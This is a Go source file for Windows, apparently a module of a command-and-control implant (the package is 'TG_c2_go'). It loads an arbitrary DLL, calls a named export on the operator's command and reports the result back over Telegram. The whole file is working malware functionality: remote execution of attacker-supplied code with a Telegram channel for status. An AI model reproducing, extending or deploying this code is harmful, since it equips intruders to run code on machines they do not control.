//go:build windows

package functions

import (
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
	
	"TG_c2_go/telegram"
)

// DLLRunner DLL调用功能
type DLLRunner struct {
	client *telegram.TelegramClient
}

// NewDLLRunner 创建新的DLL运行器
func NewDLLRunner() *DLLRunner {
	return &DLLRunner{
		client: telegram.NewTelegramClient(),
	}
}

// RunDLL 运行指定DLL的指定函数 (仅Windows)
func (dr *DLLRunner) RunDLL(dllName, functionName string) error {
	// 检查DLL文件是否存在
	if !filepath.IsAbs(dllName) {
		// 如果不是绝对路径，检查当前目录
		if _, err := os.Stat(dllName); os.IsNotExist(err) {
			msg := fmt.Sprintf("DLL文件不存在: %s", dllName)
			dr.client.SendMessage(msg)
			return fmt.Errorf(msg)
		}
	}
	
	// 在新的goroutine中运行DLL调用，避免阻塞主线程
	go func() {
		defer func() {
			if r := recover(); r != nil {
				msg := fmt.Sprintf("DLL调用发生panic: %v", r)
				dr.client.SendMessage(msg)
			}
		}()
		
		err := dr.loadAndCallDLL(dllName, functionName)
		if err != nil {
			dr.client.SendMessage(fmt.Sprintf("DLL调用失败: %v", err))
		} else {
			dr.client.SendMessage(fmt.Sprintf("成功调用 %s 中的函数 %s", dllName, functionName))
		}
	}()
	
	return nil
}

// loadAndCallDLL 加载DLL并调用指定函数
func (dr *DLLRunner) loadAndCallDLL(dllName, functionName string) error {
	// 将字符串转换为UTF16
	dllNamePtr, err := syscall.UTF16PtrFromString(dllName)
	if err != nil {
		return fmt.Errorf("转换DLL名称失败: %v", err)
	}
	
	functionNamePtr, err := syscall.BytePtrFromString(functionName)
	if err != nil {
		return fmt.Errorf("转换函数名称失败: %v", err)
	}
	
	// 加载DLL
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	loadLibraryW := kernel32.NewProc("LoadLibraryW")
	getProcAddress := kernel32.NewProc("GetProcAddress")
	freeLibrary := kernel32.NewProc("FreeLibrary")
	
	// 加载库
	handle, _, err := loadLibraryW.Call(uintptr(unsafe.Pointer(dllNamePtr)))
	if handle == 0 {
		return fmt.Errorf("加载DLL失败: %v", err)
	}
	defer freeLibrary.Call(handle)
	
	// 获取函数地址
	procAddr, _, err := getProcAddress.Call(handle, uintptr(unsafe.Pointer(functionNamePtr)))
	if procAddr == 0 {
		return fmt.Errorf("获取函数地址失败: %v", err)
	}
	
	// 调用函数 (假设函数无参数，返回值为void)
	// 注意：这是一个简化的实现，实际情况可能需要根据函数签名调整
	syscall.Syscall(procAddr, 0, 0, 0, 0)
	
	return nil
}
